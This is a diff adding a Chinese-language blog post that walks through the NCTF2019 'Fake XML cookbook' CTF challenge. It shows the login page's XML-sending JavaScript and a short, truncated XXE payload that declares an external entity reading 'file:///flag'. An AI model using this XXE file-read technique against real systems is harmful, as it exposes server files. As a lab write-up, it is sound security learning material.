@@ -1,0 +1,269 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NCTF2019 Fake XML cookbook - y1zh3e7</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="y1zh3e7,"> 
+    <meta name="description" content="[NCTF2019]Fake XML cookbook看题目XML感觉可能在提示XXE
+https://y1zh3e7.github.io/2022/08/11/XXE/
+进来环境是个登录框
+
+f1,"> 
+    <meta name="author" content="y1zh3e7"> 
+    <link rel="alternative" href="atom.xml" title="y1zh3e7" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="NCTF2019 Fake XML cookbook - y1zh3e7"/>
+    <meta name="twitter:description" content="[NCTF2019]Fake XML cookbook看题目XML感觉可能在提示XXE
+https://y1zh3e7.github.io/2022/08/11/XXE/
+进来环境是个登录框
+
+f1,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="y1zh3e7"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="NCTF2019 Fake XML cookbook - y1zh3e7"/>
+    <meta property="og:description" content="[NCTF2019]Fake XML cookbook看题目XML感觉可能在提示XXE
+https://y1zh3e7.github.io/2022/08/11/XXE/
+进来环境是个登录框
+
+f1,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+<link rel="stylesheet" href="/css/site.css">
+
+    
+<!-- 代码块复制 -->
+<script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard@latest/dist/clipboard.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">y1zh3e7</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://y1zh3e7.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">NCTF2019 Fake XML cookbook</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <!-- 帖子视图 -->
+
+    <div class="post_cover">
+        
+            <img src="/img/cover.jpg" />
+            
+                    <div class="post_cover_mask"></div>
+                    <div class="post_text">
+                        <h1>
+                            NCTF2019 Fake XML cookbook
+                        </h1>
+                        <div>
+                            <span>
+                                八月 19, 2022
+                            </span>
+
+                            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/xxe/" rel="tag">xxe</a></li></ul>
+
+
+                        </div>
+                    </div>
+    </div>
+    
+
+            <div class="article">
+                <div class='main'>
+                    <!-- 帖子视图 -->
+                    
+                            <h1 class="title">
+                                NCTF2019 Fake XML cookbook
+                            </h1>
+                            <div class="stuff">
+                                <span>
+                                    八月 19, 2022
+                                </span>
+                                
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/xxe/" rel="tag">xxe</a></li></ul>
+
+
+                            </div>
+
+
+                            <!-- 更新时间 -->
+                            <div class="updated">
+                                <div></div>
+                                <span>该文章更新于 2022.08.19</span>
+                            </div>
+
+                            <div class="content markdown">
+                                <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>看题目XML感觉可能在提示XXE</p>
+<p><a href="https://y1zh3e7.github.io/2022/08/11/XXE/">https://y1zh3e7.github.io/2022/08/11/XXE/</a></p>
+<p>进来环境是个登录框</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208192042255.png" alt="image-20220819204158159"></p>
+<p>f12看一下源码 看一下这段JavaScript</p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证登录时的用户名和密码是否为空</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// 通过AJAX 将用户名和密码以xml格式发送到doLogin.php并验证</span></span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>登录抓个包 这种自定义的标签格式就是xml了 所以构造一个DTD进行xxe就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208192046194.png" alt="image-20220819204627119"></p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY y1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208192056871.png" alt="image-20220819205646795"></p>
+
+                                    <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+                                    <audio id="audio" loop="1" preload="auto" controls="controls"
+                                        data-autoplay=" false">
+                                        <source type="audio/mpeg" src="">
+                                    </audio>
+                                    
+                                        <ul id="audio-list" style="display:none">
+                                            
+                                                
+                                                    <li title="0" data-url="https://link.hhtjim.com/163/526101268.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="1" data-url="https://link.hhtjim.com/163/526101451.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="2" data-url="https://link.hhtjim.com/163/526098988.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="3" data-url="https://link.hhtjim.com/163/526105244.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="4" data-url="https://link.hhtjim.com/163/543772350.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="5" data-url="https://link.hhtjim.com/163/1454025662.mp3"></li>
+                                                    
+                                                            
+                                                
+                                                    <li title="6" data-url="https://link.hhtjim.com/qq/004cNNNW0QG6RR.mp3"></li>
+                                                    
+                                                            
+                                        </ul>
+                                        
+                            </div>
+                            
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+                </div>
+                
+            </div>
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/codeCopy.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
